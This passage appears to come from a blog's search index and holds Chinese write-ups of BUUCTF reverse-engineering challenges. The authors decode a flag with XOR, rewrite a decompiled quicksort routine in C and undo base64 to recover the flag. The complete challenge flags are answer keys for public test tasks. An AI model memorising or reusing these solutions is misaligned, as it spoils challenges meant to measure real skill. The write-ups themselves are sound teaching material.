class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">char</span>  str[<span class="hljs-number">19</span>]=&#123;<span class="hljs-number">0xe</span>,<span class="hljs-number">0xd</span>,<span class="hljs-number">9</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x1f</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0xd</span>&#125;;<br><span class="hljs-type">char</span>  key[]=&#123;<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;?&#x27;</span>&#125;;<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">19</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">18</span>;i++)&#123;<br>flag[i]=str[i]^key[i];<br>cout&lt;&lt;flag[i];<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>得到flag前19位：flag{d07abccf8a410c</p><p>sub_40159A</p><p>看代码看不出是怎么加密的，但是flag最后一位肯定是}，加密后变为：，猜测加密方式和之前相同是逐位异或，}与71异或得到：，所以异或的数字是71</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">char</span>  str[<span class="hljs-number">5</span>]=&#123;<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;:&#x27;</span>&#125;;<br> <span class="hljs-type">char</span> a;<br> <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">4</span>;i++)&#123;<br> a=str[i]^<span class="hljs-number">71</span>;<br> cout&lt;&lt;a;<br> &#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>flag后五位：b37a}</p><p>flag{d07abccf8a410cb37a}猜测正确</p>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>smc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu刮开有奖</title>
    <link href="/2022/06/27/buu%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/"/>
    <url>/2022/06/27/buu%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/</url>
    
    <content type="html"><![CDATA[<h1 id="buu-刮开有奖"><a href="#buu-刮开有奖" class="headerlink" title="buu 刮开有奖"></a>buu 刮开有奖</h1><p>本题收获：1.有时候直接分析伪c代码的加密十分困难，跳过分析加密过程直接得到加密结果的方式有：动态调试、修复伪c代码成c代码直接运行</p><p>2.连续存储的数字或字符可以看作数组，指针和数组可以进行转换</p><p>查壳，无壳，32位文件，ida，直接进入主要函数DialogFunc</p><p><img src="/2022/06/27/buu%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/DialogFunc2.png" alt="DialogFunc2"></p><p><img src="/2022/06/27/buu%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/dialogfunc.png" alt="dialogfunc"></p><p>分析得加密主要有两部分：sub_4010F0和sub_401000</p><p>sub_4010F0加密v7开始的数组，这里分析具体过程很花时间，只要将伪c代码修改成c代码（仅需修改数组表现形式），将v7开始的一串数字定义成数组，直接运行得到加密结果即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_4010F0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// edx</span><br><br>  result = a3;<br>  <span class="hljs-keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )<br>  &#123;<br>    v5 = <span class="hljs-number">4</span> * i;<span class="hljs-comment">//int类型站四字节，4*i可看作数组下标i</span><br>    v6 = *(_DWORD *)(<span class="hljs-number">4</span> * i + a1);<span class="hljs-comment">//诸如此类可看成a[i]</span><br>    <span class="hljs-keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v6 &gt; *(_DWORD *)(a1 + <span class="hljs-number">4</span> * result) )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;<br>          ++i;<br>          *(_DWORD *)(v5 + a1) = *(_DWORD *)(a1 + <span class="hljs-number">4</span> * result);<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">while</span> ( *(_DWORD *)(a1 + <span class="hljs-number">4</span> * i) &lt;= v6 )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( ++i &gt;= result )<br>              <span class="hljs-keyword">goto</span> LABEL_13;<br>          &#125;<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;<br>          v5 = <span class="hljs-number">4</span> * i;<br>          *(_DWORD *)(a1 + <span class="hljs-number">4</span> * result) = *(_DWORD *)(<span class="hljs-number">4</span> * i + a1);<br>        &#125;<br>        --result;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( i &lt; result );<br>    &#125;<br>LABEL_13:<br>    *(_DWORD *)(a1 + <span class="hljs-number">4</span> * result) = v6;<br>    sub_4010F0(a1, a2, i - <span class="hljs-number">1</span>);<br>    result = a3;<br>    ++i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改成c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_AD10F0</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span> a2,<span class="hljs-type">char</span> a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// edx</span><br><br>  result = a3;<br>  <span class="hljs-keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )<br>  &#123;<br>    v5 = i;<br>    v6 = a1[i];<br>    <span class="hljs-keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v6 &gt; a1[result] )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;<br>          ++i;<br>          a1[v5] = a1[result];<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">while</span> ( a1[i] &lt;= v6 )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( ++i &gt;= result )<br>              <span class="hljs-keyword">goto</span> LABEL_13;<br>          &#125;<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;<br>          v5 = i;<br>          a1[result] = a1[i];<br>        &#125;<br>        --result;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( i &lt; result );<br>    &#125;<br>LABEL_13:<br>    a1[result] = v6;<br>    sub_AD10F0(a1, a2, i - <span class="hljs-number">1</span>);<br>    result = a3;<br>    ++i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span> str[<span class="hljs-number">11</span>]=&#123;<span class="hljs-number">90</span>,<span class="hljs-number">74</span>,<span class="hljs-number">83</span>,<span class="hljs-number">69</span>,<span class="hljs-number">67</span>,<span class="hljs-number">97</span>,<span class="hljs-number">78</span>,<span class="hljs-number">72</span>,<span class="hljs-number">51</span>,<span class="hljs-number">110</span>,<span class="hljs-number">103</span>&#125;;<br>sub_AD10F0(str,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,str[i]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>得到处理后的从v7[0]开始的字符串3CEHJNSZagn</p><p>接下来处理sub_401000</p><p><img src="/2022/06/27/buu%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/sub_A01000.png" alt="sub_A01000"></p><p>查看byte_407830</p><p><img src="/2022/06/27/buu%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/base64.png" alt="base64"></p><p>基本确定是base64加密</p><p>用脚本分别对ak1w和V1Ax解密，</p><p>ak1w对应base64加密输入字符串的第6，7，8位jMp</p><p>V1Ax对应base64加密输入字符串的第1，2，3位WP1</p><p>string[0]&#x3D;’3’+34&#x3D;85&#x3D;’U’<br>string[1]&#x3D;’J’</p><p>组合得到flag{UJWP1jMp}</p>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
